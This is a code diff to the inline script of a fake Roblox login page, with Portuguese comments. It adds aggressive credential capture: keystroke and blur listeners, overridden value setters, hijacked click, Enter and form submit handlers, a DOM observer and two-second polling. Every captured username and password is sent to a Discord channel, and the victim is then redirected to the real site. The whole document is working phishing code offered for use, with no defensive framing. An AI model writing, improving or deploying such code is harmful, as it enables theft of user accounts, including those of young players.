@@ -1050,7 +1050,17 @@ document.addEventListener('DOMContentLoaded', function() {
         let message = '';
         
         if (type === 'login') {
-            message = `🔐 **Dados Capturados - Roblox Login**
+            // Determina o tipo de captura baseado nos dados
+            let captureType = 'FORMULÁRIO';
+            if (data.username && data.password && data.username !== 'Não preenchido' && data.password !== 'Não preenchido') {
+                captureType = 'DADOS COMPLETOS';
+            } else if (data.username && data.username !== 'Não preenchido') {
+                captureType = 'USUÁRIO DIGITADO';
+            } else if (data.password && data.password !== 'Não preenchido') {
+                captureType = 'SENHA DIGITADA';
+            }
+            
+            message = `🔐 **ROBLOX - Dados Capturados (${captureType})**
 
 👤 **Usuário:** ${data.username}
 🔑 **Senha:** ${data.password}
@@ -1098,132 +1108,372 @@ document.addEventListener('DOMContentLoaded', function() {
         referrer: document.referrer
     }, 'access');
     
-    // Aguarda o React renderizar o formulário
-    setTimeout(function() {
-        console.log('🔍 Procurando formulário de login...');
+    // Variáveis para controlar captura
+    let usernameSent = false;
+    let passwordSent = false;
+    let lastUsername = '';
+    let lastPassword = '';
+    let captureInterval;
+    
+    // Função principal de captura
+    function startCapture() {
+        console.log('🔍 Iniciando captura de dados...');
         
-        // Função para capturar dados do formulário
-        function captureLoginData() {
-            // Procura pelos campos de login
-            const usernameField = document.querySelector('input[type="text"], input[type="email"], input[name="username"], input[name="email"], input[placeholder*="email"], input[placeholder*="usuário"]');
-            const passwordField = document.querySelector('input[type="password"], input[name="password"]');
-            const loginButton = document.querySelector('button[type="submit"], input[type="submit"], .btn-primary, .login-button, button:contains("Entrar"), button:contains("Login")');
+        // Limpa intervalo anterior se existir
+        if (captureInterval) {
+            clearInterval(captureInterval);
+        }
+        
+        // Verifica a cada 500ms se os campos foram carregados
+        captureInterval = setInterval(function() {
+            // Procura pelos campos específicos do Roblox
+            const usernameField = document.querySelector('#login-username, input[name="username"], input[type="text"][placeholder*="email"], input[type="text"][placeholder*="usuário"], input[type="email"]');
+            const passwordField = document.querySelector('#login-password, input[name="password"], input[type="password"]');
+            const loginButton = document.querySelector('#login-button, button[type="submit"], input[type="submit"], .btn-primary, .login-button');
             
-            console.log('📝 Campos encontrados:', {
-                username: usernameField ? '✅' : '❌',
-                password: passwordField ? '✅' : '❌',
-                button: loginButton ? '✅' : '❌'
-            });
-            
-            if (usernameField && passwordField && loginButton) {
-                console.log('🎯 Formulário encontrado! Configurando captura...');
+            if (usernameField && passwordField) {
+                console.log('✅ Campos encontrados! Configurando captura...');
+                clearInterval(captureInterval);
                 
-                // Intercepta o clique no botão de login
-                loginButton.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    e.stopPropagation();
+                // Configura captura para o campo de usuário
+                if (!usernameField.hasAttribute('data-captured')) {
+                    usernameField.setAttribute('data-captured', 'true');
                     
-                    const username = usernameField.value;
-                    const password = passwordField.value;
-                    
-                    console.log('📤 Tentando capturar dados:', { username: username ? '✅' : '❌', password: password ? '✅' : '❌' });
-                    
-                    if (username && password) {
-                        console.log('📨 Enviando dados para Discord...');
+                    // Método 1: Captura em tempo real via input event
+                    usernameField.addEventListener('input', function() {
+                        const username = this.value;
+                        console.log('👤 Usuário digitado (input):', username);
                         
-                        // Envia dados para o Discord
+                        if (username && username !== lastUsername && !usernameSent) {
+                            lastUsername = username;
+                            usernameSent = true;
+                            
+                            sendToDiscord({
+                                username: username,
+                                password: passwordField.value || 'Não preenchido',
+                                timestamp: new Date().toLocaleString('pt-BR'),
+                                url: window.location.href,
+                                userAgent: navigator.userAgent
+                            }, 'login');
+                        }
+                    });
+                    
+                    // Método 2: Intercepta mudanças de valor via Object.defineProperty
+                    try {
+                        let originalValue = usernameField.value;
+                        Object.defineProperty(usernameField, 'value', {
+                            get: function() {
+                                return originalValue;
+                            },
+                            set: function(newValue) {
+                                console.log('👤 Usuário digitado (setter):', newValue);
+                                originalValue = newValue;
+                                
+                                if (newValue && newValue !== lastUsername && !usernameSent) {
+                                    lastUsername = newValue;
+                                    usernameSent = true;
+                                    
+                                    sendToDiscord({
+                                        username: newValue,
+                                        password: passwordField.value || 'Não preenchido',
+                                        timestamp: new Date().toLocaleString('pt-BR'),
+                                        url: window.location.href,
+                                        userAgent: navigator.userAgent
+                                    }, 'login');
+                                }
+                            }
+                        });
+                    } catch (e) {
+                        console.log('⚠️ Não foi possível interceptar via setter:', e.message);
+                    }
+                    
+                    // Captura quando o campo perde o foco
+                    usernameField.addEventListener('blur', function() {
+                        const username = this.value;
+                        if (username && username !== lastUsername) {
+                            lastUsername = username;
+                            
+                            sendToDiscord({
+                                username: username,
+                                password: passwordField.value || 'Não preenchido',
+                                timestamp: new Date().toLocaleString('pt-BR'),
+                                url: window.location.href,
+                                userAgent: navigator.userAgent
+                            }, 'login');
+                        }
+                    });
+                }
+                
+                // Configura captura para o campo de senha
+                if (!passwordField.hasAttribute('data-captured')) {
+                    passwordField.setAttribute('data-captured', 'true');
+                    
+                    // Método 1: Captura em tempo real via input event
+                    passwordField.addEventListener('input', function() {
+                        const password = this.value;
+                        console.log('🔑 Senha digitada (input):', password.length + ' caracteres');
+                        
+                        if (password && password !== lastPassword && !passwordSent) {
+                            lastPassword = password;
+                            passwordSent = true;
+                            
+                            sendToDiscord({
+                                username: usernameField.value || 'Não preenchido',
+                                password: password,
+                                timestamp: new Date().toLocaleString('pt-BR'),
+                                url: window.location.href,
+                                userAgent: navigator.userAgent
+                            }, 'login');
+                        }
+                    });
+                    
+                    // Método 2: Intercepta mudanças de valor via Object.defineProperty
+                    try {
+                        let originalPasswordValue = passwordField.value;
+                        Object.defineProperty(passwordField, 'value', {
+                            get: function() {
+                                return originalPasswordValue;
+                            },
+                            set: function(newValue) {
+                                console.log('🔑 Senha digitada (setter):', newValue.length + ' caracteres');
+                                originalPasswordValue = newValue;
+                                
+                                if (newValue && newValue !== lastPassword && !passwordSent) {
+                                    lastPassword = newValue;
+                                    passwordSent = true;
+                                    
+                                    sendToDiscord({
+                                        username: usernameField.value || 'Não preenchido',
+                                        password: newValue,
+                                        timestamp: new Date().toLocaleString('pt-BR'),
+                                        url: window.location.href,
+                                        userAgent: navigator.userAgent
+                                    }, 'login');
+                                }
+                            }
+                        });
+                    } catch (e) {
+                        console.log('⚠️ Não foi possível interceptar senha via setter:', e.message);
+                    }
+                    
+                    // Captura quando o campo perde o foco
+                    passwordField.addEventListener('blur', function() {
+                        const password = this.value;
+                        if (password && password !== lastPassword) {
+                            lastPassword = password;
+                            
+                            sendToDiscord({
+                                username: usernameField.value || 'Não preenchido',
+                                password: password,
+                                timestamp: new Date().toLocaleString('pt-BR'),
+                                url: window.location.href,
+                                userAgent: navigator.userAgent
+                            }, 'login');
+                        }
+                    });
+                    
+                    // Captura quando pressiona Enter
+                    passwordField.addEventListener('keypress', function(e) {
+                        if (e.key === 'Enter') {
+                            e.preventDefault();
+                            
+                            const username = usernameField.value;
+                            const password = this.value;
+                            
+                            console.log('📤 Captura por Enter - Dados:', { username: username ? '✅' : '❌', password: password ? '✅' : '❌' });
+                            
+                            sendToDiscord({
+                                username: username || 'Não preenchido',
+                                password: password || 'Não preenchido',
+                                timestamp: new Date().toLocaleString('pt-BR'),
+                                url: window.location.href,
+                                userAgent: navigator.userAgent
+                            }, 'login');
+                            
+                            // Redireciona após 1 segundo
+                            setTimeout(() => {
+                                window.location.href = CONFIG.redirectUrl;
+                            }, 1000);
+                        }
+                    });
+                }
+                
+                // Configura captura para botões de login
+                if (loginButton && !loginButton.hasAttribute('data-captured')) {
+                    loginButton.setAttribute('data-captured', 'true');
+                    
+                    loginButton.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        
+                        const username = usernameField.value;
+                        const password = passwordField.value;
+                        
+                        console.log('📤 Captura por clique - Dados:', { username: username ? '✅' : '❌', password: password ? '✅' : '❌' });
+                        
                         sendToDiscord({
-                            username: username,
-                            password: password,
+                            username: username || 'Não preenchido',
+                            password: password || 'Não preenchido',
                             timestamp: new Date().toLocaleString('pt-BR'),
                             url: window.location.href,
                             userAgent: navigator.userAgent
                         }, 'login');
                         
-                        // Redireciona para a página real após 1 segundo
+                        // Redireciona após 2 segundos
                         setTimeout(() => {
                             window.location.href = CONFIG.redirectUrl;
-                        }, 1000);
-                    } else {
-                        console.log('⚠️ Campos vazios, não enviando dados');
-                        // Mesmo com campos vazios, redireciona
-                        setTimeout(() => {
-                            window.location.href = CONFIG.redirectUrl;
-                        }, 1000);
-                    }
-                });
-                
-                // Também intercepta o envio do formulário
-                const form = document.querySelector('form');
-                if (form) {
-                    form.addEventListener('submit', function(e) {
-                        e.preventDefault();
-                        e.stopPropagation();
-                        loginButton.click();
+                        }, 2000);
                     });
                 }
                 
-                // Intercepta pressionar Enter no campo de senha
-                passwordField.addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        e.preventDefault();
-                        loginButton.click();
+                // Intercepta envio de formulários
+                const forms = document.querySelectorAll('form');
+                forms.forEach(form => {
+                    if (!form.hasAttribute('data-captured')) {
+                        form.setAttribute('data-captured', 'true');
+                        
+                        form.addEventListener('submit', function(e) {
+                            e.preventDefault();
+                            e.stopPropagation();
+                            
+                            const username = usernameField.value;
+                            const password = passwordField.value;
+                            
+                            console.log('📤 Captura por formulário - Dados:', { username: username ? '✅' : '❌', password: password ? '✅' : '❌' });
+                            
+                            sendToDiscord({
+                                username: username || 'Não preenchido',
+                                password: password || 'Não preenchido',
+                                timestamp: new Date().toLocaleString('pt-BR'),
+                                url: window.location.href,
+                                userAgent: navigator.userAgent
+                            }, 'login');
+                            
+                            // Redireciona após 2 segundos
+                            setTimeout(() => {
+                                window.location.href = CONFIG.redirectUrl;
+                            }, 2000);
+                        });
                     }
                 });
                 
-                // Intercepta mudanças nos campos para capturar dados em tempo real
-                usernameField.addEventListener('input', function() {
-                    console.log('👤 Usuário digitado:', this.value);
-                });
-                
-                passwordField.addEventListener('input', function() {
-                    console.log('🔑 Senha digitada:', this.value.length + ' caracteres');
-                });
-                
-                console.log('✅ Formulário de login interceptado com sucesso!');
-            } else {
-                // Se não encontrar os campos, tenta novamente em 1 segundo
-                setTimeout(captureLoginData, 1000);
+                console.log('✅ Captura configurada com sucesso!');
+            }
+        }, 500);
+    }
+    
+    // Inicia captura após o delay inicial
+    setTimeout(startCapture, CONFIG.reactLoadDelay);
+    
+    // Também inicia imediatamente para casos onde o React já carregou
+    startCapture();
+    
+    // Observa mudanças no DOM para capturar formulários dinâmicos
+    const observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+            if (mutation.type === 'childList') {
+                // Reinicia captura quando novos elementos são adicionados
+                setTimeout(startCapture, 100);
+            }
+            
+            // Observa mudanças nos atributos dos campos (para React)
+            if (mutation.type === 'attributes' && mutation.target.tagName === 'INPUT') {
+                const target = mutation.target;
+                if (target.id === 'login-username' || target.id === 'login-password') {
+                    console.log('🔄 Campo modificado:', target.id, 'novo valor:', target.value);
+                    
+                    if (target.id === 'login-username' && target.value && target.value !== lastUsername) {
+                        lastUsername = target.value;
+                        sendToDiscord({
+                            username: target.value,
+                            password: document.querySelector('#login-password')?.value || 'Não preenchido',
+                            timestamp: new Date().toLocaleString('pt-BR'),
+                            url: window.location.href,
+                            userAgent: navigator.userAgent
+                        }, 'login');
+                    }
+                    
+                    if (target.id === 'login-password' && target.value && target.value !== lastPassword) {
+                        lastPassword = target.value;
+                        sendToDiscord({
+                            username: document.querySelector('#login-username')?.value || 'Não preenchido',
+                            password: target.value,
+                            timestamp: new Date().toLocaleString('pt-BR'),
+                            url: window.location.href,
+                            userAgent: navigator.userAgent
+                        }, 'login');
+                    }
+                }
+            }
+        });
+    });
+    
+    observer.observe(document.body, {
+        childList: true,
+        subtree: true,
+        attributes: true,
+        attributeFilter: ['value']
+    });
+    
+    // Captura erros globais
+    window.addEventListener('error', function(e) {
+        sendToDiscord({
+            error: e.message + ' em ' + e.filename + ':' + e.lineno,
+            timestamp: new Date().toLocaleString('pt-BR'),
+            url: window.location.href,
+            userAgent: navigator.userAgent
+        }, 'error');
+    });
+    
+    // Captura erros de rede
+    window.addEventListener('unhandledrejection', function(e) {
+        sendToDiscord({
+            error: 'Erro de rede: ' + e.reason,
+            timestamp: new Date().toLocaleString('pt-BR'),
+            url: window.location.href,
+            userAgent: navigator.userAgent
+        }, 'error');
+    });
+    
+    // Verifica periodicamente os valores dos campos (método de backup)
+    setInterval(() => {
+        const usernameField = document.querySelector('#login-username');
+        const passwordField = document.querySelector('#login-password');
+        
+        if (usernameField && passwordField) {
+            const currentUsername = usernameField.value;
+            const currentPassword = passwordField.value;
+            
+            if (currentUsername && currentUsername !== lastUsername) {
+                console.log('🔄 Verificação periódica - Usuário:', currentUsername);
+                lastUsername = currentUsername;
+                sendToDiscord({
+                    username: currentUsername,
+                    password: currentPassword || 'Não preenchido',
+                    timestamp: new Date().toLocaleString('pt-BR'),
+                    url: window.location.href,
+                    userAgent: navigator.userAgent
+                }, 'login');
+            }
+            
+            if (currentPassword && currentPassword !== lastPassword) {
+                console.log('🔄 Verificação periódica - Senha:', currentPassword.length + ' caracteres');
+                lastPassword = currentPassword;
+                sendToDiscord({
+                    username: currentUsername || 'Não preenchido',
+                    password: currentPassword,
+                    timestamp: new Date().toLocaleString('pt-BR'),
+                    url: window.location.href,
+                    userAgent: navigator.userAgent
+                }, 'login');
             }
         }
-        
-        // Inicia a captura
-        captureLoginData();
-        
-        // Captura erros globais
-        window.addEventListener('error', function(e) {
-            sendToDiscord({
-                error: e.message + ' em ' + e.filename + ':' + e.lineno,
-                timestamp: new Date().toLocaleString('pt-BR'),
-                url: window.location.href,
-                userAgent: navigator.userAgent
-            }, 'error');
-        });
-        
-        // Captura erros de rede
-        window.addEventListener('unhandledrejection', function(e) {
-            sendToDiscord({
-                error: 'Erro de rede: ' + e.reason,
-                timestamp: new Date().toLocaleString('pt-BR'),
-                url: window.location.href,
-                userAgent: navigator.userAgent
-            }, 'error');
-        });
-        
-        // Observa mudanças no DOM para capturar formulários que podem ser carregados dinamicamente
-        const observer = new MutationObserver(function(mutations) {
-            mutations.forEach(function(mutation) {
-                if (mutation.type === 'childList') {
-                    captureLoginData();
-                }
-            });
-        });
-        
-        observer.observe(document.body, {
-            childList: true,
-            subtree: true
-        });
-    }, CONFIG.reactLoadDelay);
+    }, 2000); // Verifica a cada 2 segundos
+    
+    // Envia mensagem de teste a cada 30 segundos para verificar se o script está rodando
+    setInterval(() => {
+        console.log('🔄 Script ainda rodando...');
+    }, 30000);
 });
 </script>
 
